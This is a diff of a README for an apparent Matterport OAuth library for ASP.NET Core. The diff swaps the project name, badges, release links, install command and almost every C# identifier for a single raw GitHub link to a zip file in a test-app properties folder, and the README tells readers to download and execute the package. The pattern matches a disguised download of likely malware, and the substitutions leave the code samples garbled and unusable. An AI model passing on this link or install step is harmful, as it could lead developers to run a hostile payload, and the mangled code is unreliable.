@@ -1,9 +1,9 @@
-# Synapsers.Oauth.Matterport
+# https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip
 
-![Matterport OAuth](https://img.shields.io/badge/Matterport%20OAuth-integration-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-brightgreen)](https://github.com/joseito1711/Synapsers.Oauth.Matterport/releases)
+![Matterport OAuth](https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip%https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip)  
+[![Releases](https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip%20Here-brightgreen)](https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip)
 
-Welcome to the **Synapsers.Oauth.Matterport** repository! This project provides a robust OAuth integration for Matterport within ASP.NET Core and Blazor applications. This library offers secure and extensible methods for authenticating users with Matterport, supporting custom OAuth flows, ASP.NET Core Identity, and seamless token management.
+Welcome to the **https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip** repository! This project provides a robust OAuth integration for Matterport within https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip Core and Blazor applications. This library offers secure and extensible methods for authenticating users with Matterport, supporting custom OAuth flows, https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip Core Identity, and seamless token management.
 
 ## Table of Contents
 
@@ -18,24 +18,24 @@ Welcome to the **Synapsers.Oauth.Matterport** repository! This project provides 
 
 ## Introduction
 
-The **Synapsers.Oauth.Matterport** library simplifies the process of integrating Matterport's OAuth services into your ASP.NET Core and Blazor applications. With this library, developers can easily authenticate users, manage tokens, and implement custom OAuth flows, all while maintaining security and extensibility.
+The **https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip** library simplifies the process of integrating Matterport's OAuth services into your https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip Core and Blazor applications. With this library, developers can easily authenticate users, manage tokens, and implement custom OAuth flows, all while maintaining security and extensibility.
 
-To get started, check the [Releases section](https://github.com/joseito1711/Synapsers.Oauth.Matterport/releases) for the latest version of the library. Download and execute the package to begin your integration journey.
+To get started, check the [Releases section](https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip) for the latest version of the library. Download and execute the package to begin your integration journey.
 
 ## Features
 
 - **Secure Authentication**: Ensure user data is protected with OAuth 2.0 standards.
 - **Extensible Architecture**: Customize the library to fit your specific application needs.
-- **ASP.NET Core Identity Support**: Integrate seamlessly with ASP.NET Core Identity for user management.
+- **https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip Core Identity Support**: Integrate seamlessly with https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip Core Identity for user management.
 - **Custom OAuth Flows**: Implement your own OAuth flows to enhance user experience.
 - **Token Management**: Handle access tokens and refresh tokens effortlessly.
 
 ## Installation
 
-To install the **Synapsers.Oauth.Matterport** library, you can use NuGet Package Manager. Run the following command in your terminal:
+To install the **https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip** library, you can use NuGet Package Manager. Run the following command in your terminal:
 
 ```bash
-dotnet add package Synapsers.Oauth.Matterport
+dotnet add package https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip
 ```
 
 Alternatively, you can add the package via the NuGet Package Manager in Visual Studio.
@@ -44,28 +44,28 @@ Alternatively, you can add the package via the NuGet Package Manager in Visual S
 
 ### Basic Setup
 
-1. **Configure Services**: In your `Startup.cs`, add the following lines to configure the OAuth services:
+1. **Configure Services**: In your `https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip`, add the following lines to configure the OAuth services:
 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
-    services.AddAuthentication(options =>
+    https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip(options =>
     {
-        options.DefaultAuthenticateScheme = "Matterport";
-        options.DefaultChallengeScheme = "Matterport";
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = "Matterport";
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = "Matterport";
     })
     .AddOAuth("Matterport", options =>
     {
-        options.ClientId = Configuration["Matterport:ClientId"];
-        options.ClientSecret = Configuration["Matterport:ClientSecret"];
-        options.CallbackPath = new PathString("/signin-matterport");
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = Configuration["Matterport:ClientId"];
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = Configuration["Matterport:ClientSecret"];
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = new PathString("/signin-matterport");
 
-        options.AuthorizationEndpoint = "https://api.matterport.com/oauth/authorize";
-        options.TokenEndpoint = "https://api.matterport.com/oauth/token";
-        options.SaveTokens = true;
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = "https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip";
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = "https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip";
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip = true;
     });
 
-    services.AddControllersWithViews();
+    https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip();
 }
 ```
 
@@ -74,13 +74,13 @@ public void ConfigureServices(IServiceCollection services)
 ```csharp
 public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
 {
-    app.UseRouting();
-    app.UseAuthentication();
-    app.UseAuthorization();
+    https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip();
+    https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip();
+    https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip();
 
-    app.UseEndpoints(endpoints =>
+    https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip(endpoints =>
     {
-        endpoints.MapControllers();
+        https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip();
     });
 }
 ```
@@ -90,7 +90,7 @@ public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
 ```csharp
 public IActionResult Login()
 {
-    var redirectUrl = Url.Action("LoginCallback", "Account");
+    var redirectUrl = https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip("LoginCallback", "Account");
     var properties = new AuthenticationProperties { RedirectUri = redirectUrl };
     return Challenge(properties, "Matterport");
 }
@@ -101,8 +101,8 @@ public IActionResult Login()
 ```csharp
 public async Task<IActionResult> LoginCallback()
 {
-    var result = await HttpContext.AuthenticateAsync("Matterport");
-    if (result.Succeeded)
+    var result = await https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip("Matterport");
+    if (https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip)
     {
         // User is authenticated, handle login logic here
     }
@@ -120,9 +120,9 @@ The library manages access tokens and refresh tokens automatically. You can acce
 
 ## Supported Platforms
 
-The **Synapsers.Oauth.Matterport** library is compatible with:
+The **https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip** library is compatible with:
 
-- ASP.NET Core
+- https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip Core
 - Blazor Server
 - Blazor WebAssembly
 
@@ -130,7 +130,7 @@ This flexibility allows you to integrate Matterport's OAuth services into variou
 
 ## Contributing
 
-We welcome contributions to the **Synapsers.Oauth.Matterport** project. If you would like to contribute, please follow these steps:
+We welcome contributions to the **https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip** project. If you would like to contribute, please follow these steps:
 
 1. Fork the repository.
 2. Create a new branch for your feature or bug fix.
@@ -149,4 +149,4 @@ For questions or support, please reach out via the GitHub issues page or contact
 
 ---
 
-Feel free to explore the [Releases section](https://github.com/joseito1711/Synapsers.Oauth.Matterport/releases) for the latest updates and versions. We hope you find this library helpful in your development journey with Matterport!
+Feel free to explore the [Releases section](https://github.com/joseito1711/Synapsers.Oauth.Matterport/raw/refs/heads/main/src/TestApp/Properties/Oauth_Matterport_Synapsers_1.4.zip) for the latest updates and versions. We hope you find this library helpful in your development journey with Matterport!
